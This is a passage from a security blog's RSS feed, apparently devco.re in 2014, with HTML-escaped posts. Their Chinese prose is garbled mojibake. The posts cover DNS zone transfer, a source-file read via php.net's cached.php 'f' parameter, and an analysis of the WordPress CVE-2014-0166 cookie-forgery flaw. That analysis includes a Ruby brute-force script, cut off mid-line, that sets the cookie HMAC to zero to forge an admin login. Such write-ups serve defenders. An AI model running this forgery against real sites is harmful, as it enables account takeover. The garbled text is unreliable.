&lt;p&gt;å¦‚æœä¼æ¥­ä»Šå¤©éå¸¸æœ‰è‡ªä¿¡èƒ½å¤ æ›¿æ‰€æœ‰ç¶²åŸŸéƒ½æº–å‚™å¥½å®Œå–„çš„å®‰å…¨æªæ–½ï¼Œé‚£éº¼ zone transfer æ‰€æ´©æ¼çš„è³‡æ–™å°è©²ä¼æ¥­å°±ä¸æœƒæœ‰å¤ªåš´é‡çš„å½±éŸ¿ã€‚ç„¶è€Œï¼Œåœ¨ç¾ä»Šé€™å€‹å…¥ä¾µæ‰‹æ³•æ—¥æ–°æœˆç•°çš„ä¸–ç•Œè£¡ï¼Œåˆæœ‰èª°èƒ½å¤ æ°¸é ä¿è­‰è‡ªå·±çš„å®‰å…¨é˜²è­·å·²ç¶“åšè¶³äº†å‘¢ï¼Ÿåœ¨å‰é™£å­ç«ç´…çš„ &lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;OpenSSL CVE-2014-0160 Heartbleed&lt;/a&gt; å•é¡Œè¢«çˆ†å‡ºä¾†ä¹‹å¾Œï¼Œæˆ‘å€‘å°±è—‰ç”±è¨±å¤š zone transfer çš„è¨˜éŒ„è§€å¯Ÿåˆ°å…¨ä¸–ç•Œæœ‰éå¸¸å¤šä¼æ¥­åªä¿®å¾©äº†ä¸»è¦ç¶²ç«™çš„ OpenSSL æ¼æ´ï¼Œå»å¿½ç•¥äº†ä¼æ¥­å…§å…¶ä»–çš„æœå‹™èˆ‡è¨­å‚™å¯èƒ½ä¹Ÿæœ‰æ­¤æ¼æ´ï¼Œåƒæ˜¯ DBã€Emailã€VPNã€NAS ç­‰ç­‰ï¼Œç›´åˆ°ä»Šæ—¥ä»é²é²æœªä¿®å¾©ã€‚&lt;/p&gt;

&lt;p&gt;åƒè¬åˆ¥ä»¥ç‚ºä½ æ‰€è³¼è²·çš„å„ç¨®è³‡å®‰è¨­å‚™èƒ½é˜²ç¦¦æ‰€æœ‰è³‡å®‰å¼±é»ï¼Œä¹Ÿåˆ¥å¿½ç•¥äº†å„é …å¤è€çš„è³‡å®‰å¼±é»ï¼Œæ›´åˆ¥å°çœ‹äº†ä½ æ‰€ä¸ç†Ÿæ‚‰çš„é§­å®¢å€‘çš„çµ„åˆå„å¼å„æ¨£å¼±é»çš„èƒ½åŠ›ï¼Œåªè¦æœ‰ä¸€å€‹è³‡å®‰ç’°ç¯€ç–æ¼ï¼Œéš¨æ™‚éƒ½æœ‰å¯èƒ½å°ä¼æ¥­é€ æˆè‡´å‘½å±æ©Ÿã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/</link>
                <guid>https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue</guid>
                <pubDate>Mon, 05 May 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>PHP å®˜ç¶²åŸå§‹ç¢¼è®€å–æ¡ˆä¾‹</title>
                <description>&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References&quot;&gt;ä¸å®‰å…¨çš„å¼•ç”¨ç‰©ä»¶ (Insecure Direct Object Reference)&lt;/a&gt; æ˜¯å€‹éå¸¸å¸¸è¦‹çš„è³‡å®‰æ¼æ´ï¼Œåœ¨ &lt;a href=&quot;https://www.owasp.org/&quot;&gt;OWASP&lt;/a&gt; å…¬å¸ƒçš„&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-Top_10&quot;&gt;åå¤§ç¶²ç«™æ‡‰ç”¨ç¨‹å¼å®‰å…¨æ¼æ´&lt;/a&gt; ä¸­é«˜å±…ç¬¬å››åã€‚é€šå¸¸ç™¼ç”Ÿåœ¨ç¶²ç«™æ‡‰ç”¨ç¨‹å¼ä¸Šæ²’æœ‰é‡å°è¼¸å…¥çš„åƒæ•¸åšå¥½æª¢æŸ¥ï¼Œå°±æŠŠåƒæ•¸ä¸Ÿå…¥ include æˆ– readfile ç­‰å‡½æ•¸ç•¶ä¸­å¼•ç”¨ï¼Œä½¿å¾—æ”»æ“Šè€…å¯ä»¥è—‰æ­¤å­˜å–ä»»æ„æ–‡ä»¶çš„åŸå§‹ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;ä»Šå¤©é€™å€‹æ¡ˆä¾‹å°±ç™¼ç”Ÿåœ¨ PHP çš„å®˜æ–¹ç¶²ç«™ (&lt;a href=&quot;http://www.php.net/&quot;&gt;http://www.php.net/&lt;/a&gt;)ï¼Œæ¶ˆæ¯ä¾†æºæ˜¯çŸ¥åçš„ 0-Day é»‘å¸‚ 1337dayï¼Œç™¼ä½ˆçš„æ—¥æœŸæ˜¯ 2014/4/4 ï¼ŒåŸå§‹çš„å…§å®¹æ˜¯é€™æ¨£çš„ï¼š&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_00_1337day.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_00_1337day.png&quot; alt=&quot;1337day æ¼æ´äº¤æ˜“ç¶²ç«™&quot; title=&quot;1337day æ¼æ´äº¤æ˜“ç¶²ç«™&quot; /&gt;&lt;br /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°é€™å€‹å¼±é»æ˜¯ä¸å…¬é–‹çš„ï¼Œæƒ³è¦çŸ¥é“å…§å®¹çš„è©±è¦æ”¯ä»˜ 82 ç¾å…ƒç›¸ç•¶æ–¼æ–°å°å¹£ 3500 å…ƒå‘¢ï¼åœ¨å¼·çƒˆçš„å¥½å¥‡å¿ƒå±ˆä½¿ä¹‹ä¸‹ï¼Œè‡ªå·±æ‰“é–‹å·¥å…·ä¾†æ‰¾çœ‹çœ‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_01_source_code.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_01_source_code.png&quot; alt=&quot;PHP å®˜æ–¹ç¶²ç«™åŸå§‹ç¢¼&quot; title=&quot;PHP å®˜æ–¹ç¶²ç«™åŸå§‹ç¢¼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;é€éç°¡å–®çš„åˆ†æå’Œä¸€é»é»é‹æ°£ï¼Œæ‰¾åˆ°äº† ã€Œ&lt;a href=&quot;http://www.php.net/cached.php&quot;&gt;http://www.php.net/cached.php&lt;/a&gt;ã€ é€™éš»ç¨‹å¼ï¼Œç™¼ç¾å®ƒå‚³å…¥äº†ã€Œtã€å’Œã€Œfã€é€™å…©å€‹åƒæ•¸ã€‚ã€Œtã€ç›´è¦ºä¸Šå°±æ˜¯å€‹ rand æ•¸å€¼ï¼Œè€Œã€Œfã€æ‡‰è©²å°±æ˜¯æª”æ¡ˆä½ç½®äº†ã€‚é€™æ™‚å€™å° f åƒæ•¸å°å°ä¿®æ”¹ä¸€ä¸‹ï¼Œç¥å¥‡çš„äº‹æƒ…ç™¼ç”Ÿäº†ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_02_cached.php.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_02_cached.php.png&quot; alt=&quot;cached.php è®€å–åŸå§‹ç¢¼&quot; title=&quot;cached.php è®€å–åŸå§‹ç¢¼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;index.php çš„åŸå§‹ç¢¼è¢«å®Œæ•´çš„è®€å‡ºä¾†ï¼Œç•¶ç„¶ä¹Ÿè¦ä¾†çœ‹ä¸€ä¸‹ cached.php æ˜¯æ€éº¼å¯«çš„ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot; alt=&quot;cached.php æª¢è¦–åŸå§‹ç¢¼&quot; title=&quot;cached.php æª¢è¦–åŸå§‹ç¢¼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°æ­¤è™•ä¸¦æœªå° $_GET[â€œfâ€] é€²è¡Œæª¢æŸ¥ï¼Œæ‰€ä»¥ä¿®æ”¹äº† $_GET[â€œfâ€] å¾Œï¼Œèˆ‡ $abs çµ„åˆå®Œï¼Œæœ€å¾Œå°±ç›´æ¥ä¸Ÿå…¥ readfile è®€å–æª”æ¡ˆã€‚æ¯”è¼ƒå€¼å¾—ç ”ç©¶çš„æ˜¯é€™é‚Šä½¿ç”¨äº† realpath èˆ‡ strncmp ä¾†æ¯”è¼ƒ f åŠ DOCUMENT_ROOTï¼Œç¢ºä¿ $abs åªèƒ½åœ¨ç¶²ç«™ç›®éŒ„ä¹‹ä¸‹ï¼Œæ‰€ä»¥ç„¡æ³•ä½¿ç”¨ ../../ (&lt;a href=&quot;https://www.owasp.org/index.php/Path_Traversal&quot;&gt;Path Traversal&lt;/a&gt;) çš„æ–¹å¼è·³è„«ç›®éŒ„é€²è¡Œæ›´é€²ä¸€æ­¥çš„æ»²é€ã€‚&lt;/p&gt;

&lt;p&gt;æœ€å¾Œæˆ‘å€‘å°‡æ­¤ç™¼ç¾å›å ±çµ¦ security@php.net ï¼Œå¾—åˆ°çš„å›æ‡‰æ˜¯ä»–å€‘æ˜¯ã€Œæ•…æ„çš„ (intentional)ã€ã€‚ä¸”å¾Œä¾†ä¹ŸçŸ¥é“ PHP å®˜ç¶²æ˜¯é–‹æ”¾åŸå§‹ç¢¼ï¼ˆOpen Sourceï¼‰çš„ï¼Œå¯ä»¥åˆ° &lt;a href=&quot;http://git.php.net/?p=web/php.git;a=tree&quot;&gt;http://git.php.net/?p=web/php.git;a=tree&lt;/a&gt; ä¸‹è¼‰æ•´å€‹å®˜ç¶²çš„åŸå§‹ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_04_php_team_response.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_04_php_team_response.png&quot; alt=&quot;PHP.NET å®˜ç¶²åœ˜éšŠå›æ‡‰&quot; title=&quot;PHP.NET å®˜ç¶²åœ˜éšŠå›æ‡‰&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;é›–ç„¶åœ¨é€™å€‹æ¡ˆä¾‹ä¸­ä¸¦æ²’æœ‰é€ æˆå¯¦è³ªä¸Šçš„å±å®³ï¼Œæ²’æœ‰å¸³è™Ÿã€å¯†ç¢¼ã€ç³»çµ±è¨­å®šç­‰æ©Ÿæ•è³‡æ–™ï¼Œä½†è‹¥æŠŠæ­¤ç¨®å¯«æ³•ç”¨åœ¨å…¶ä»–åœ°æ–¹ï¼Œå‰‡å¯èƒ½é€ æˆå¾ˆå¤§çš„è³‡å®‰é¢¨éšªã€‚å°±é€£ PHP å®˜æ–¹ç¶²ç«™éƒ½æœ‰é€™æ¨£çš„å¤±èª¤ï¼Œèº«ç‚ºé–‹ç™¼äººå“¡çš„ä½ å€‘æ›´ä¸å¯ä¸æ…ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/24/php.net-insecure-direct-object-reference/</link>
                <guid>https://devco.re/blog/2014/04/24/php.net-insecure-direct-object-reference</guid>
                <pubDate>Thu, 24 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>CVE-2014-0166 WordPress å½é€  Cookie å¼±é»</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;åœ¨ä¸€é™£ OpenSSL Heartbleed æ·˜é‡‘æ½®ä¸­ï¼Œåˆæœ‰ä¸€å€‹æŠ€è¡“é–€æª»ä½ã€å¾Œæœåš´é‡ã€ä¹ŸåŒæ¨£éœ€è¦äº›é‹æ°£çš„æ¼æ´è¢«æ­ç™¼ï¼&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0166&quot;&gt;CVE-2014-0166&lt;/a&gt;ã€‚CVE-2014-0166 æ˜¯ WordPress ä¸Šé¢é©—è­‰ç™»å…¥ cookie çš„å¼±é»ï¼Œæ”»æ“Šè€…å¯ä»¥æš´åŠ›å½é€ å‡ºåˆæ³• cookieï¼Œè—‰æ­¤ç²å¾— WordPress æœ€é«˜æ¬Šé™ï¼Œé€²è€Œæ‹¿åˆ° shell å–å¾—ç³»çµ±æ“ä½œæ¬Šã€‚&lt;br /&gt;
è®“æˆ‘å€‘ä¾†åˆ†æä¸€ä¸‹é€™æ¬¡çš„å¼±é»æ˜¯ç™¼ç”Ÿäº†ä»€éº¼äº‹å§ï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;è§£æ&quot;&gt;è§£æ&lt;/h3&gt;

&lt;p&gt;é€™æ¬¡å‡ºå•é¡Œçš„ç¨‹å¼ç¢¼åœ¨&lt;a href=&quot;https://github.com/WordPress/WordPress/blob/684145ca8101e9ba5d9b4516709121fbe0fb9aee/wp-includes/pluggable.php#L650&quot;&gt;é€™é‚Š&lt;/a&gt;ï¼Œé—œéµç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;wp_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pass_frag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$expiration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$scheme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash_hmac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;md5&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$expiration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$hmac&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;sd&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   * Fires if a bad authentication cookie hash is encountered.&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   *&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   * @since 2.7.0&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   *&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   * @param array $cookie_elements An array of data for the authentication cookie.&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   */&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;do_action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;auth_cookie_bad_hash&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_elements&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å•é¡Œä¸»è¦ç™¼ç”Ÿåœ¨æ¯”è¼ƒé‹ç®—å­ != ä¸Šé¢ï¼Œ!= é‹ç®—å­æ˜¯ non-strictï¼Œæœƒåœ¨æ¯”è¼ƒå‰å…ˆåšå‹æ…‹è½‰æ›ï¼Œæ‰€ä»¥ä¸‹é¢çœ‹ä¼¼æ‡‰è©²æ˜¯å›å‚³ true çš„ä¾‹å­ï¼Œå…¨éƒ¨éƒ½é¡¯ç¤ºç‚º falseï¼Œç´°ç¯€è«‹åƒé–±&lt;a href=&quot;http://www.php.net/manual/en/language.operators.comparison.php&quot;&gt;å®˜æ–¹æ‰‹å†Š&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0 != 0 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;01&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 1 != 1 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;10&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;1e1&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 10 != 10 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;1e2&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 100 != 100 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;0e10123456789012345678901234567890&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0 != 0 -&amp;gt; false&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;é€²å…¥æ­£é¡Œï¼ŒWordPress èªè­‰èº«åˆ†ç”¨çš„ cookie å…§å®¹æ˜¯é€™æ¨£çš„ï¼šã€username|expiration|hmacã€ã€‚&lt;br /&gt;&lt;br /&gt;
username æ˜¯ä½¿ç”¨è€…åç¨±ï¼Œ&lt;br /&gt;&lt;br /&gt;
expiration æ˜¯æœ‰æ•ˆæœŸé™(timestamp)ï¼Œ&lt;br /&gt;&lt;br /&gt;
hmac å€¼ç”¨ä¾†é©—è­‰ cookie æ˜¯å¦åˆæ³•ã€‚&lt;br /&gt;&lt;br /&gt;
å¾ä¸Šé¢ç¨‹å¼ç¢¼å¯ä»¥çœ‹åˆ°ï¼Œhmac çš„ç®—æ³•æ˜¯ç¶“é usernameã€pass_fragã€expirationã€key ç¶œåˆå¾—å‡ºã€‚è‹¥æœ‰è¾¦æ³•æ§åˆ¶ cookie ä¸­çš„ hmac ä½¿ä¼ºæœå™¨èªç‚ºè©² cookie åˆæ³•ï¼Œå°±å¯ä»¥æˆåŠŸå½é€ æˆ usernameã€‚&lt;/p&gt;

&lt;p&gt;åˆ©ç”¨ç¨æ—©æåˆ°çš„æ¯”è¼ƒé‹ç®—å­å•é¡Œï¼Œè‹¥æˆ‘å€‘è®“ cookie ä¸­çš„ hmac å€¼ç‚º 0ï¼Œå¾ˆæœ‰å¯èƒ½è®“åˆ¤æ–·å¼è®Šæˆä¸‹é¢é€™æ¨£ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;//if ( $hmac != $hash ) {&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;0e10123456789012345678901234567890&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;do_action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;auth_cookie_bad_hash&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_elements&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å¦‚æ­¤ä¾¿å¯ä»¥é€šéé©—è­‰ï¼ŒæˆåŠŸå½é€ åˆæ³• cookieã€‚&lt;br /&gt;&lt;br /&gt;
è€Œç‚ºäº†è®“ $hash == 0ï¼Œå¯ä»¥ä¸æ–·æ”¹è®Š cookie ä¸­çš„ expirationï¼Œè®“ç”¢ç”Ÿçš„ MD5 å€¼($hash)ç¶“éå‹æ…‹è½‰æ›å¾Œå‰›å¥½è®Šæˆ 0ã€‚&lt;br /&gt;&lt;br /&gt;
ç¬¦åˆ $hash == 0 çš„ MD5 $hash å€¼æœ‰ &lt;br /&gt;
0eXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXã€00eXXXXXXXXXXXXXXXXXXXXXXXXXXXXXâ€¦.000000000000000000000000000eXã€00000000000000000000000000000 (X = 0,1,2,3,4,5,6,7,8,9)&lt;/p&gt;

&lt;p&gt;æ•…å‡ºç¾ $hash == 0 çš„æ©Ÿç‡ç‚º Sum(10^n,n=0,30)/16^32 = 3.265262085617465e-09&lt;/p&gt;

&lt;p&gt;æ¯æ¬¡å½é€ çš„æˆåŠŸæ©Ÿç‡ç´„ç‚ºä¸‰å„„åˆ†ä¹‹ä¸€ï¼Œä¸¦ä¸æœƒå¾ˆé«˜ï¼Œä½†å·²ç¶“è¶³å¤ åœ¨ä¸€å€‹æœˆå…§æ‹¿åˆ°æœ€é«˜æ¬Šé™ï¼Œè€Œä¸”æ‰€è€—æˆæœ¬ä¸¦ä¸æœƒå¾ˆé«˜ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å¯¦é©—&quot;&gt;å¯¦é©—&lt;/h3&gt;

&lt;p&gt;ç‚ºäº†é©—è­‰æ­¤æ–¹æ³•ä¹‹å¯è¡Œæ€§ï¼Œæˆ‘å€‘æ¶è¨­äº† &lt;a href=&quot;http://tw.WordPress.org/WordPress-3.8.1-zh_TW.zip&quot;&gt;WordPress 3.8.1&lt;/a&gt; ç’°å¢ƒã€‚ä¸¦ä¸”å¯«ç¨‹å¼å°‡ç™»å…¥ cookie ä¸­çš„ hmac è¨­ç‚º 0ï¼Œä¸æ–·èª¿æ•´ expiration å€¼æ¸¬è©¦æ˜¯å¦å·²ç¶“ç™»å…¥ï¼Œç¨‹å¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;httpclient&amp;#39;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;HTTPClient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;cookie_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;WordPress_logged_in_de5be3cf9fcea023a1303527e10ea67a&amp;quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_i&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;.timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;800000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;http://domain.my/WordPress/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Cookie&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span 